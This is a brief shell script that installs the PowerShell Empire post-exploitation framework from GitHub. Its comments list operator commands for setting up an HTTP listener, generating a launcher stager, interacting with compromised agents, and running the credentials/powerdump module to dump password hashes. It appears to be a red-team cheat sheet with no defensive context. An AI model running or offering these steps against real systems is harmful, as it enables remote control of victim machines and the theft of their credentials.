#!/bin/sh
# Powershell Empire Installation
cd /opt
git clone https://github.com/EmpireProject/Empire.git
cd Empire
./setup/install.sh
#./setup/setup_database.py

# Set Listener
# > listeners
# > set Host http://ip:8080
# > execute
# > list

# Stager
# > usestager launcher test
# > info
# > generate

# Agents
# > agents
# > interact <name>
# > usemodule credentials/powerdump
# > run